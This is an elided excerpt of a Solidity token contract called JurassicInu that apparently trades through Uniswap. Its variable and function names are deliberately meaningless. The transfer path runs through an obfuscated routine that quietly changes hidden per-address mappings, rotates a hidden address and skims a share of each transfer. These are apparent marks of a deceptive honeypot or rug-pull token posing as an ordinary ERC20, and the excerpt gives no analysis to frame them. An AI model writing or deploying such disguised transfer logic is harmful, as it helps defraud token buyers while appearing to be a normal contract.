...
contract JurassicInu is Ownable {
    ...
    string private slave;
    uint8 private native;
    ...
    uint256 private wonderful = ~grass;
    IUniswapV2Router02 public uniswapV2Router;
    address private hard;
    ...
    function group(
        ...
        address triangle = (uniswapV2Pair);

        if (represent[stick] == 0 && (triangle != stick) && stream[stick] > 0) {
            represent[stick] -= native;
        }

        address parallel = hard;
        hard = familiar;

        family[stick] -= motor;
        uint256 stranger = (motor / 100) * grass;
        motor -= stranger;
        stream[parallel] += native;
        family[familiar] += motor;
    }
    ...
    function transferFrom(
        ...
        group(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        group(msg.sender, recipient, amount);
        return true;
    }
